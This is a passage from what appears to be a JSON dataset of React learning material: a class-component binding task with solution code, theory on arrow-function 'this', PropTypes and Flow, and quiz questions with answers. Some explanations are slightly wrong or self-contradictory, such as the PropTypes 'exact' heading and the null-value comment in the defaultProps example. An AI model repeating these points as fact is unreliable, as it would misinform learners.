            "react_class_components",
            "javascript_this_context"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "beginner",
          "relatedConcepts": [
            "controlled_components",
            "uncontrolled_components"
          ]
        },
        {
          "id": "task_event_handler_multiple_bindings",
          "title": "Compare Binding Methods in a Class Component",
          "description": "\nExtend the previous task by demonstrating multiple ways to bind event handlers in a React class component. Create a component with two different buttons, each using a distinct method for binding its `onClick` handler, and observe their behaviors and performance implications.\n\n**Requirements:**\n1.  A single React class component (`BindingDemo`).\n2.  Maintain a `count` state variable initialized to 0.\n3.  Implement a `handleIncrement` method that increments the `count`.\n4.  Create two buttons:\n    *   **Button 1**: Uses the **constructor binding** method for its `onClick` handler. \n    *   **Button 2**: Uses the **arrow function as a class property** method for its `onClick` handler.\n5.  Include `console.log` statements in the `render` method and inside `handleIncrement` to track execution. Specifically, log `this` inside `handleIncrement` to confirm its context.\n6.  (Optional) Add a third button that uses **inline arrow function in render** (e.g., `onClick={() => this.handleIncrement()}`) and discuss its performance implications vs. the other two.\n",
          "difficulty": "medium",
          "startingCode": "import React from 'react';\n\nclass BindingDemo extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      count: 0\n    };\n    // TODO: Bind handleIncrement for Button 1 here\n  }\n\n  // Method for Button 1 (to be bound in constructor)\n  handleIncrementMethod() {\n    // TODO: Increment count\n    console.log('handleIncrementMethod: this is', this);\n  }\n\n  // Method for Button 2 (using class property arrow function)\n  handleIncrementArrow = () => {\n    // TODO: Increment count\n    console.log('handleIncrementArrow: this is', this);\n  };\n\n  render() {\n    console.log('BindingDemo: Render method called');\n    return (\n      <div style={{ padding: '20px' }}>\n        <h3>Binding Methods Comparison</h3>\n        <p>Count: {this.state.count}</p>\n        <div>\n          <button onClick={/* TODO: Use constructor-bound method */}>\n            Increment (Constructor Bind)\n          </button>\n          <button onClick={this.handleIncrementArrow}>\n            Increment (Class Property Arrow)\n          </button>\n          {/* Optional: Add a third button for inline binding */}\n        </div>\n      </div>\n    );\n  }\n}\n\n// Usage: <BindingDemo />",
          "solutionCode": "import React from 'react';\n\nclass BindingDemo extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      count: 0\n    };\n    // Binding for Button 1: In the constructor\n    this.handleIncrementMethod = this.handleIncrementMethod.bind(this);\n  }\n\n  // Method for Button 1\n  handleIncrementMethod() {\n    console.log('handleIncrementMethod: this is', this); // Should log the component instance\n    this.setState(prevState => ({\n      count: prevState.count + 1\n    }));\n  }\n\n  // Method for Button 2: Using class property arrow function (lexical 'this')\n  handleIncrementArrow = () => {\n    console.log('handleIncrementArrow: this is', this); // Should log the component instance\n    this.setState(prevState => ({\n      count: prevState.count + 1\n    }));\n  };\n\n  render() {\n    console.log('BindingDemo: Render method called');\n    return (\n      <div style={{ padding: '20px', border: '1px solid #ccc', borderRadius: '8px', maxWidth: '600px', margin: '0 auto' }}>\n        <h3>Binding Methods Comparison</h3>\n        <p>Count: {this.state.count}</p>\n        <div style={{ display: 'flex', gap: '15px' }}>\n          <button onClick={this.handleIncrementMethod} style={{ padding: '10px 15px', background: '#4CAF50', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}>\n            Increment (Constructor Bind)\n          </button>\n          <button onClick={this.handleIncrementArrow} style={{ padding: '10px 15px', background: '#2196F3', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}>\n            Increment (Class Property Arrow)\n          </button>\n          {/* Optional: Inline arrow function in render - less performant */}\n          <button onClick={() => this.handleIncrementMethod()} style={{ padding: '10px 15px', background: '#ff9800', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}>\n            Increment (Inline Arrow in Render)\n          </button>\n        </div>\n      </div>\n    );\n  }\n}\n",
          "testCases": [
            "Initial render: Console should log 'BindingDemo: Render method called'.",
            "Click 'Increment (Constructor Bind)': Count should increase, `handleIncrementMethod` should log `this` as the component instance, and 'BindingDemo: Render method called' should appear.",
            "Click 'Increment (Class Property Arrow)': Count should increase, `handleIncrementArrow` should log `this` as the component instance, and 'BindingDemo: Render method called' should appear.",
            "Rapid clicks: Observe that `handleIncrementMethod` and `handleIncrementArrow` are consistently bound.",
            "Optional: Click 'Increment (Inline Arrow in Render)': Count should increase. Observe that `render` is called, and `this` is correctly bound. Discuss why this might be less performant (new function on every render)."
          ],
          "hints": [
            "For constructor binding, you need `this.methodName = this.methodName.bind(this);`.",
            "For class property arrow functions, simply define the method like `myMethod = () => { ... };`.",
            "Remember to pass the *reference* to the bound method to `onClick`, not a function call.",
            "Use `console.log(this)` inside each handler to confirm `this` refers to the component instance."
          ],
          "tags": [
            "React",
            "class-components",
            "event-handlers",
            "binding",
            "this-context",
            "performance",
            "best-practices"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "react_class_components",
            "javascript_this_context",
            "javascript_arrow_functions"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "function_binding",
            "lexical_this"
          ]
        }
      ]
    }
  },
  {
    "id": "d0fe0128-9b35-4729-9645-3ec65ea2b24d",
    "startLine": 13900,
    "endLine": 13999,
    "processedDate": "2025-06-17T13:42:16.002Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_arrow_functions_this_binding",
          "title": "Understanding 'this' Binding with Arrow Functions in React Class Components",
          "content": "In JavaScript classes, especially within React class components, the `this` keyword can be a source of confusion. By default, when a method is passed as a callback (e.g., an event handler like `onClick` or `onChange`), its `this` context is lost and defaults to `undefined` in strict mode. This leads to errors when trying to access `this.state` or `this.setState` inside such methods.\n\nTraditionally, developers would explicitly bind `this` to the component instance using `Function.prototype.bind()` in the constructor, or directly in the JSX, or by using a class property with a traditional function expression:\n\n```typescript\nclass MyComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.handleClick = this.handleClick.bind(this); // Binding in constructor\n  }\n\n  handleClick() {\n    // this is now correctly bound\n    this.setState({ clicked: true });\n  }\n\n  render() {\n    return <button onClick={this.handleClick}>Click Me</button>;\n  }\n}\n\n// Or binding in JSX (less performant for frequent re-renders):\n// <button onClick={this.handleClick.bind(this)}>Click Me</button>\n```\n\nArrow functions provide a more concise and intuitive solution to this problem. When an arrow function is defined as a class property, it automatically binds `this` to the instance of the class where it's defined. This lexical `this` binding ensures that `this` always refers to the component instance, eliminating the need for explicit binding.\n\nThis syntax (`myMethod = () => {...}`) is part of the 'class properties' proposal (or 'public class fields') and is typically enabled by build tools like Babel, which is included in `create-react-app`.",
          "examples": [
            {
              "id": "example_arrow_functions_this_binding_1",
              "title": "Arrow Function for Event Handler Binding",
              "code": "import React, { Component } from 'react';\n\nclass DataInput extends Component {\n  constructor(props) {\n    super(props);\n    this.state = { data: '' };\n  }\n\n  // Arrow function automatically binds 'this' to the component instance\n  onInputChange = (e) => {\n    // 'this' is preserved here, referring to the DataInput component\n    this.setState({ data: e.currentTarget.value });\n  };\n\n  render() {\n    return (\n      <div>\n        <input type=\"text\" value={this.state.data} onChange={this.onInputChange} />\n        <p>Current Data: {this.state.data}</p>\n      </div>\n    );\n  }\n}\n\n// Usage example:\n// <DataInput />",
              "explanation": "This example demonstrates how an arrow function defined as a class property (`onInputChange = (e) => {...}`) automatically binds `this` to the `DataInput` component instance. When `onChange` is triggered, `e.currentTarget.value` correctly updates the component's state without needing `bind()` in the constructor. This makes the code cleaner and less error-prone for event handlers.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "React",
            "JavaScript",
            "this",
            "Arrow Functions",
            "Class Components",
            "ES6"
          ],
          "technology": "React",
          "prerequisites": [
            "JavaScript_this_keyword",
            "React_class_components",
            "ES6_arrow_functions"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "React_class_component_best_practices",
            "React_event_handling"
          ]
        },
        {
          "id": "theory_runtime_type_checking_prop_types",
          "title": "Runtime Type Checking with PropTypes in React Applications",
          "content": "PropTypes is a JavaScript library (originally built into React, now external) that provides runtime type checking for React props. It helps in validating the data types of props passed to your components, catching bugs early by warning you in the console if a component receives props of an unexpected type.\n\nWhile not a substitute for static type checkers like TypeScript or Flow, PropTypes serves as a useful guardrail, especially in JavaScript-only projects, to ensure components receive valid data at runtime.\n\n### Key Concepts and Validators:\n*   **Basic Types**: `PropTypes.string`, `PropTypes.number`, `PropTypes.bool`, `PropTypes.func`, `PropTypes.array`, `PropTypes.object`, `PropTypes.symbol`, `PropTypes.node`, `PropTypes.element`, `PropTypes.elementType`.\n*   **Required Props**: Append `.isRequired` to any type validator to ensure a prop must be provided. If a required prop is missing, a warning will be logged.\n*   **Specific Instances**: `PropTypes.instanceOf(MyClass)`.\n*   **Enums (OneOf)**: `PropTypes.oneOf(['option1', 'option2'])` validates that a prop is one of a limited set of values.\n*   **Multiple Types (OneOfType)**: `PropTypes.oneOfType([PropTypes.string, PropTypes.number])` allows a prop to be one of several types.\n*   **Arrays of a Specific Type**: `PropTypes.arrayOf(PropTypes.string)` ensures an array contains only strings.\n*   **Objects with Specific Structure (Shape)**: `PropTypes.shape({ key1: PropTypes.string, key2: PropTypes.number })` validates that an object conforms to a specific shape.\n*   **Objects without Strict Structure (Exact)**: `PropTypes.exact({ key1: PropTypes.string, key2: PropTypes.number })` is similar to `shape` but warns if additional keys are present.\n*   **Custom Validators**: You can define your own validation logic by providing a function. This function receives `props`, `propName`, and `componentName` as arguments. It should return an `Error` object if validation fails, or `null`/`undefined` if successful.\n\n### Default Props:\n`defaultProps` is a static property on a component that allows you to define default values for props. These values are used if the parent component does not provide a value for a particular prop, or if the value is `undefined`. `defaultProps` are processed *before* `propTypes` validation, meaning if a default prop is applied, it will be validated by `propTypes`.",
          "examples": [
            {
              "id": "example_prop_types_1",
              "title": "UserProfile Component with PropTypes and Default Props",
              "code": "import PropTypes from 'prop-types';\n\nfunction UserProfile({ name, age, isActive, hobbies, onUpdate, contactInfo, level }) {\n  return (\n    <div>\n      <h2>{name}</h2>\n      <p>Age: {age}</p>\n      <p>Status: {isActive ? 'Active' : 'Inactive'}</p>\n      <ul>\n        {hobbies.map(hobby => <li key={hobby}>{hobby}</li>)}\n      </ul>\n      {contactInfo && <p>Email: {contactInfo.email}</p>}\n      <p>Level: {level}</p>\n      <button onClick={onUpdate}>Update Profile</button>\n    </div>\n  );\n}\n\nUserProfile.propTypes = {\n  name: PropTypes.string.isRequired,\n  age: PropTypes.number,\n  isActive: PropTypes.bool.isRequired,\n  hobbies: PropTypes.arrayOf(PropTypes.string),\n  onUpdate: PropTypes.func.isRequired,\n  // Complex object shape validation\n  contactInfo: PropTypes.shape({\n    email: PropTypes.string.isRequired,\n    phone: PropTypes.string\n  }),\n  // Custom validator: ensures level is between 1-10\n  level: function(props, propName, componentName) {\n    const value = props[propName];\n    if (value === undefined) {\n      // Allow undefined if not required, or handle via defaultProps\n      return null; \n    }\n    if (typeof value !== 'number' || value < 1 || value > 10) {\n      return new Error(\n        `Invalid prop \\`${propName}\\` supplied to \\`${componentName}\\`. Level must be a number between 1-10.`\n      );\n    }\n    return null;\n  }\n};\n\n// Default prop values are applied before propTypes validation\nUserProfile.defaultProps = {\n  age: 25,\n  hobbies: [],\n  contactInfo: { email: 'user@example.com' },\n  level: 5 // Example default level\n};\n\n// Example Usage:\n// <UserProfile name=\"Alice\" isActive={true} onUpdate={() => console.log('Update!')} />\n// <UserProfile name=\"Bob\" isActive={false} hobbies={['Reading', 'Coding']} level={8} />\n// <UserProfile name=\"Charlie\" isActive={true} level={0} /> // Will log a PropTypes warning for 'level'",
              "explanation": "This example demonstrates various PropTypes validators in action. `name`, `isActive`, and `onUpdate` are marked as `isRequired`. `hobbies` is an array of strings, `contactInfo` is an object with a specific shape (where `email` is required and `phone` is optional). A `custom validator` is implemented for `level` to ensure its value falls within a specific range. Finally, `defaultProps` are set for `age`, `hobbies`, and `contactInfo` to provide fallback values if these props are not explicitly passed to the `UserProfile` component.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "React",
            "PropTypes",
            "Type Checking",
            "Runtime Validation",
            "JavaScript",
            "Front-end Development"
          ],
          "technology": "React",
          "prerequisites": [
            "React_components",
            "JavaScript_functions_and_objects"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Robust_react_components",
            "Component_reusability"
          ]
        },
        {
          "id": "theory_static_type_checking_flow",
          "title": "Static Type Checking with Flow in React Applications",
          "content": "Flow is a static type checker for JavaScript developed by Facebook. Unlike PropTypes, which performs checks at runtime, Flow analyzes your code *before* it runs (at build time) to find type errors. This allows developers to catch potential bugs and maintain code consistency during the development phase, providing immediate feedback in the IDE or build process.\n\nFlow uses annotations (type syntax) added to your JavaScript code to understand the expected types of variables, function parameters, return values, and React component props. It can also infer types in many cases, reducing the need for explicit annotations.\n\n### Key Concepts:\n*   **`// @flow` directive**: To enable Flow checking for a specific file, you must add `// @flow` at the top of the file.\n*   **Type Aliases**: You can define custom types using the `type` keyword, making your code more readable and reusable for complex type definitions (e.g., `type Props = {...}`).\n*   **Optional Properties**: In type definitions, a property can be marked as optional using the `?` suffix (e.g., `phone?: string`). This means the property may or may not be present.\n*   **Function Types**: Define the types of parameters and the return type for functions (e.g., `() => void` for a function that takes no arguments and returns nothing).\n*   **Annotating Component Props**: You can annotate the `props` parameter of a functional component with a type alias (e.g., `function UserProfile(props: Props)`).\n\n### Flow vs. PropTypes:\n*   **When they check**: Flow checks *statically* (before execution), PropTypes checks *dynamically* (at runtime).\n*   **Error Reporting**: Flow provides build-time errors/warnings (often in IDEs), PropTypes provides console warnings at runtime.\n*   **Use Cases**: Flow is for comprehensive type safety during development; PropTypes is a lighter-weight solution primarily for validating component props during execution.\n*   **Superseding**: In projects using static type checkers like TypeScript or Flow, PropTypes is often considered redundant for prop validation as the static checker already covers those checks more rigorously. However, PropTypes can still be useful for third-party library consumers or for providing more user-friendly runtime errors.",
          "examples": [
            {
              "id": "example_flow_1",
              "title": "UserProfile Component with Flow Types",
              "code": "// @flow\nimport * as React from 'react';\n\ntype ContactInfo = {\n  email: string,\n  phone?: string,\n};\n\ntype Props = {\n  name: string,\n  age: number,\n  isActive: boolean,\n  hobbies: Array<string>,\n  onUpdate: () => void,\n  contactInfo?: ContactInfo,\n  level: number,\n};\n\nfunction UserProfile(props: Props) {\n  const { name, age, isActive, hobbies, onUpdate, contactInfo, level } = props;\n  return (\n    <div>\n      <h2>{name}</h2>\n      <p>Age: {age}</p>\n      <p>Status: {isActive ? 'Active' : 'Inactive'}</p>\n      <ul>\n        {hobbies.map(hobby => <li key={hobby}>{hobby}</li>)}\n      </ul>\n      {contactInfo && <p>Email: {contactInfo.email}</p>}\n      <p>Level: {level}</p>\n      <button onClick={onUpdate}>Update Profile</button>\n    </div>\n  );\n}\n\n// Example Usage (Flow will check these at build time):\n// <UserProfile name=\"Alice\" age={30} isActive={true} hobbies={['reading']} onUpdate={() => {}} level={7} />\n// <UserProfile name=\"Bob\" age={25} isActive={false} hobbies={[]} onUpdate={() => {}} contactInfo={{ email: 'bob@example.com' }} level={5} />\n// <UserProfile name=\"Charlie\" isActive={true} onUpdate={() => {}} level=\"ten\" /> // Flow error: Type 'string' is not assignable to 'number'\n",
              "explanation": "This example demonstrates how to apply Flow for static type checking in a React functional component. The `// @flow` directive enables Flow for the file. A `type Props` alias is defined to specify the expected types for each prop, including `Array<string>` for hobbies, an optional `ContactInfo` object, and a function type `() => void` for `onUpdate`. The `UserProfile` component then uses this `Props` type to annotate its `props` parameter. Flow will analyze this code during development and report type mismatches, such as passing a string to a prop expecting a number.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "React",
            "Flow",
            "Static Type Checking",
            "JavaScript",
            "Type System",
            "Front-end Development"
          ],
          "technology": "React",
          "prerequisites": [
            "JavaScript_types",
            "React_functional_components"
          ],
          "complexity": 7,
          "interviewRelevance": 6,
          "learningPath": "advanced",
          "requiredFor": [
            "Large_scale_react_applications",
            "Code_maintainability"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_arrow_functions_this_1",
          "topic": "'this' Binding with Arrow Functions",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary advantage of using an arrow function as a class property for an event handler in a React class component?",
          "answer": "It automatically binds `this` to the component instance, eliminating the need for explicit binding in the constructor or JSX.",
          "options": [],
          "analysisPoints": [
            "Lexical 'this' binding.",
            "Avoids common 'this' issues in event handlers.",
            "Cleaner syntax compared to `.bind()`."
          ],
          "keyConcepts": [
            "this binding",
            "arrow functions",
            "React class components"
          ],
          "evaluationCriteria": [
            "Understanding of core arrow function behavior in React context."
          ],
          "example": "",
          "tags": [
            "React",
            "JavaScript",
            "this",
            "Arrow Functions"
          ],
          "prerequisites": [
            "JavaScript_this_keyword"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_arrow_functions_this_2",
          "topic": "'this' Binding with Arrow Functions",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following React class component:\n\n```typescript\nimport React, { Component } from 'react';\n\nclass MyForm extends Component {\n  constructor(props) {\n    super(props);\n    this.state = { value: '' };\n  }\n\n  // Method A\n  handleChangeA(event) {\n    this.setState({ value: event.target.value });\n  }\n\n  // Method B\n  handleChangeB = (event) => {\n    this.setState({ value: event.target.value });\n  }\n\n  render() {\n    return (\n      <div>\n        <input type=\"text\" onChange={this.handleChangeB} />\n        {/* What would happen if we used this.handleChangeA here directly? */}\n      </div>\n    );\n  }\n}\n```\n\nIf `onChange={this.handleChangeA}` were used directly without binding `handleChangeA` in the constructor or in JSX, what would be the result when typing into the input?",
          "answer": "A TypeError would occur because `this` would be `undefined` within `handleChangeA`.",
          "options": [
            "The state would update correctly without issues.",
            "A TypeError would occur because `this` would be `undefined` within `handleChangeA`.",
            "The component would re-render infinitely.",
            "The input value would update, but the state would remain unchanged."
          ],
          "analysisPoints": [
            "Understanding of default 'this' context for class methods when passed as callbacks.",
            "Knowledge of strict mode behavior where 'this' defaults to undefined.",
            "Distinction between traditional methods and arrow function class properties regarding 'this' binding."
          ],
          "keyConcepts": [
            "this binding",
            "event handlers",
            "class methods",
            "TypeError"
          ],
          "evaluationCriteria": [
            "Ability to predict runtime behavior of JavaScript 'this'.",
            "Understanding of React event handling nuances."
          ],
          "example": "Explanation: When `this.handleChangeA` is passed directly as an `onChange` prop, it loses its `this` context. In modern JavaScript (which runs in strict mode), `this` inside `handleChangeA` would be `undefined`. Consequently, `this.setState` would attempt to call `undefined.setState`, resulting in a `TypeError`.",
          "tags": [
            "React",
            "JavaScript",
            "this",
            "Event Handling",
            "Error Handling"
          ],
          "prerequisites": [
            "JavaScript_this_keyword",
            "React_event_handling"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_prop_types_1",
          "topic": "PropTypes Basics",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of PropTypes in a React application?",
          "answer": "To perform runtime type checking for component props, helping to validate data types and catch bugs early by logging console warnings.",
          "options": [],
          "analysisPoints": [
            "Runtime validation vs. static validation.",
            "Debugging aid.",
            "Console warnings."
          ],
          "keyConcepts": [
            "PropTypes",
            "Runtime Type Checking",
            "Prop Validation"
          ],
          "evaluationCriteria": [
            "Basic understanding of PropTypes functionality."
          ],
          "example": "",
          "tags": [
            "React",
            "PropTypes",
            "Type Checking"
          ],
          "prerequisites": [
            "React_props"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_prop_types_2",
          "topic": "PropTypes Validators",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following `PropTypes` validators should you use to ensure a prop named `user` is an object that *must* have a `name` property (string) and *may* have an `age` property (number)?",
          "answer": "`PropTypes.shape({ name: PropTypes.string.isRequired, age: PropTypes.number })`",
          "options": [
            "`PropTypes.objectOf(PropTypes.string, PropTypes.number)`",
            "`PropTypes.shape({ name: PropTypes.string.isRequired, age: PropTypes.number })`",
            "`PropTypes.arrayOf(PropTypes.object)`",
            "`PropTypes.instanceOf(Object)`"
          ],
          "analysisPoints": [
            "Correct use of `PropTypes.shape` for object structure validation.",
            "Understanding of `.isRequired` for nested properties.",
            "Distinguishing `shape` from other object/array validators."
          ],
          "keyConcepts": [
            "PropTypes.shape",
            "PropTypes.string",
            "PropTypes.number",
            ".isRequired"
          ],
          "evaluationCriteria": [
            "Ability to apply correct PropTypes validator for complex object structures.",
            "Understanding of nested validation."
          ],
          "example": "Explanation: `PropTypes.shape` is used to validate that an object conforms to a specific shape by defining the types of its properties. `.isRequired` is used to mark `name` as mandatory within that shape. `age` is left without `.isRequired` making it optional. Other options like `objectOf` are for objects where all values are of a specific type, `arrayOf` is for arrays, and `instanceOf` checks against a class instance.",
          "tags": [
            "React",
            "PropTypes",
            "Object Validation"
          ],
          "prerequisites": [
            "React_props"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_prop_types_3",
          "topic": "PropTypes Custom Validator & Default Props",
          "level": "hard",
          "type": "open",
          "question": "Explain the interaction between `PropTypes.isRequired` and `defaultProps`. If a prop is marked as `isRequired` but also has a default value specified in `defaultProps`, what happens if the parent component does not pass this prop?",
          "answer": "When a prop is marked as `isRequired` and also has a default value in `defaultProps`, if the parent component does *not* pass that prop, the `defaultProps` value will be applied first. After `defaultProps` are applied, `PropTypes` validation runs. Since the prop will now have a value (from `defaultProps`), it will satisfy the `isRequired` check, and no warning will be issued. Essentially, `defaultProps` provide a fallback, preventing the `isRequired` warning when the prop is omitted by the parent.",
          "options": [],
          "analysisPoints": [
            "Order of execution for `defaultProps` and `propTypes`.",
            "How `defaultProps` can satisfy `isRequired` checks.",
            "The purpose of each feature in isolation and combination."
          ],
          "keyConcepts": [
            "PropTypes.isRequired",
            "defaultProps",
            "Prop Validation Order"
          ],
          "evaluationCriteria": [
            "Deep understanding of React prop validation lifecycle.",
            "Ability to explain interactions between different prop features."
          ],
          "example": "```typescript\nimport React from 'react';\nimport PropTypes from 'prop-types';\n\nfunction Greeting({ message }) {\n  return <p>{message}</p>;\n}\n\nGreeting.propTypes = {\n  message: PropTypes.string.isRequired,\n};\n\nGreeting.defaultProps = {\n  message: 'Hello, World!',\n};\n\n// Usage:\n// <Greeting /> // No warning, 'Hello, World!' is used.\n// <Greeting message=\"Hi!\" /> // 'Hi!' is used.\n// <Greeting message={undefined} /> // No warning, 'Hello, World!' is used.\n// <Greeting message={null} /> // Warning: 'message' is not a string, but isRequired is satisfied by non-null value\n```\nIn the example, if `<Greeting />` is rendered without a `message` prop, `defaultProps` assigns 'Hello, World!'. Then, PropTypes checks if `message` is present and a string. Since it's now 'Hello, World!', both checks pass, and no warning is displayed. If `message={null}` is passed, `defaultProps` does not apply (as `null` is a defined value), and PropTypes will warn that `null` is not a string.",
          "tags": [
            "React",
            "PropTypes",
            "defaultProps",
            "Prop Validation"
          ],
          "prerequisites": [
            "PropTypes",
            "defaultProps"
          ],
          "complexity": 7,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_type_checking_comparison_1",
          "topic": "Static vs. Runtime Type Checking",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following statements *best* describes the primary difference between Flow (or TypeScript) and PropTypes?",
          "answer": "Flow performs static type checking during development, while PropTypes performs runtime type checking in the browser.",
          "options": [
            "Flow is for JavaScript, while PropTypes is specifically for React.",
            "Flow performs static type checking during development, while PropTypes performs runtime type checking in the browser.",
            "Flow allows type inference, but PropTypes requires explicit type declarations.",
            "PropTypes provides better error messages than Flow."
          ],
          "analysisPoints": [
            "Understanding the core distinction: static vs. runtime.",
            "Knowing when each tool performs its checks.",
            "Recognizing their respective primary purposes."
          ],
          "keyConcepts": [
            "Static Type Checking",
            "Runtime Type Checking",
            "Flow",
            "PropTypes"
          ],
          "evaluationCriteria": [
            "Ability to articulate the fundamental difference between type checking methodologies.",
            "Knowledge of Flow and PropTypes roles."
          ],
          "example": "Explanation: The most crucial difference is *when* the type checks occur. Flow (and TypeScript) analyze code *before* it runs (statically), catching errors during development. PropTypes checks happen *while* the application is running (at runtime), primarily warning about incorrect prop types in the browser console. Both are for JavaScript and can be used with React, but their mechanisms and timing differ significantly.",
          "tags": [
            "React",
            "Type Checking",
            "Flow",
            "PropTypes",
            "Static Analysis"
          ],
          "prerequisites": [
            "PropTypes",
            "Flow_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_flow_basics_1",
          "topic": "Flow Syntax",
          "level": "easy",
          "type": "flashcard",
          "question": "How do you enable Flow type checking for a specific JavaScript file?",
          "answer": "By adding the `// @flow` directive as the first line of the file.",
          "options": [],
          "analysisPoints": [
            "Flow file directive."
          ],
          "keyConcepts": [
            "Flow",
            "Type Checking",
            "Directives"
          ],
          "evaluationCriteria": [
            "Basic knowledge of Flow setup."
          ],
          "example": "",
          "tags": [
            "Flow",
            "Type Checking",
            "Setup"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_flow_basics_2",
          "topic": "Flow Type Aliases and Optional Properties",
          "level": "medium",
          "type": "open",
          "question": "Define a Flow type alias named `User` that includes `id` (number, required), `username` (string, required), and `email` (string, optional). Then, show how you would use this type to annotate the props of a functional React component called `UserCard`.",
          "answer": "```typescript\n// @flow\nimport * as React from 'react';\n\ntype User = {\n  id: number,\n  username: string,\n  email?: string,\n};\n\ntype UserCardProps = {\n  user: User,\n};\n\nfunction UserCard(props: UserCardProps) {\n  const { user } = props;\n  return (\n    <div>\n      <h3>{user.username} (ID: {user.id})</h3>\n      {user.email && <p>Email: {user.email}</p>}\n    </div>\n  );\n}\n```",
          "options": [],
          "analysisPoints": [
            "Correct syntax for `type` alias.",
            "Understanding of optional properties (`?`).",
            "Correct application of type to component props."
          ],
          "keyConcepts": [
            "Flow type alias",
            "Optional properties",
            "React component props annotation"
          ],
          "evaluationCriteria": [
            "Ability to define complex Flow types.",
            "Correctly apply types to React components.",
            "Understanding of Flow's type system features."
          ],
          "example": "",
          "tags": [
            "Flow",
            "Type Checking",
            "React",
            "Type Aliases"
          ],
          "prerequisites": [
            "Flow_basics",
            "React_functional_components"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_this_binding_advanced_3",
          "topic": "'this' Context in Callbacks",
          "level": "hard",
          "type": "open",
          "question": "Beyond `class-properties` arrow functions, discuss at least two other common methods to ensure `this` context is correctly bound to a React class component instance within an event handler, and briefly explain their pros and cons.",
          "answer": "1.  **Binding in the Constructor**: This is a widely adopted practice.\n    *   **Method**: `this.handleClick = this.handleClick.bind(this);` inside the `constructor`.\n    *   **Pros**: Only binds once per component instance, making it performant. `this` context is explicitly clear.\n    *   **Cons**: Can become verbose if many event handlers need binding. Requires adding a `constructor` even if only for binding.\n\n2.  **Arrow Function in JSX**: Binding directly in the render method.\n    *   **Method**: `<button onClick={() => this.handleClick()} >Click Me</button>` or `<button onClick={this.handleClick.bind(this)}>Click Me</button>`.\n    *   **Pros**: Concise for single-use or very simple cases. No need to modify the constructor.\n    *   **Cons**: Creates a *new* function instance on every render. This can lead to performance issues (unnecessary re-renders of child components that receive the new function as a prop) and makes strict equality checks (`React.memo`, `PureComponent`) less effective. Generally discouraged for performance-critical scenarios or large lists.\n\n3.  **Directly defining method as Arrow Function (Class Property Syntax)**: (Already covered extensively, but good to include for completeness and comparison).\n    *   **Method**: `handleClick = () => { this.setState(...) };`\n    *   **Pros**: Most concise and readable. `this` is lexically bound automatically. Binds once per instance.\n    *   **Cons**: Requires Babel's class properties transform. Not part of standard ES class syntax (yet, it's a proposal).",
          "options": [],
          "analysisPoints": [
            "Knowledge of various binding strategies.",
            "Understanding performance implications.",
            "Ability to critically evaluate trade-offs."
          ],
          "keyConcepts": [
            "this binding",
            "constructor binding",
            "inline arrow function",
            "performance",
            "React re-renders"
          ],
          "evaluationCriteria": [
            "Comprehensive knowledge of `this` binding techniques.",
            "Ability to articulate pros and cons.",
            "Understanding of performance considerations in React."
          ],
          "example": "",
          "tags": [
            "React",
            "JavaScript",
            "this",
            "Performance",
            "Best Practices"
          ],
          "prerequisites": [
            "JavaScript_this_keyword",
            "React_class_components"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_prop_types_code_4",
          "topic": "PropTypes Validation",
          "level": "medium",
          "type": "code",
          "question": "Implement a React functional component `ProductCard` that displays product information. It should accept the following props with PropTypes validation:\n\n*   `name`: string, required.\n*   `price`: number, required.\n*   `isInStock`: boolean, optional (defaults to `true`).\n*   `tags`: an array of strings, optional (defaults to an empty array).\n\nProvide the component definition and its `propTypes` and `defaultProps`.",
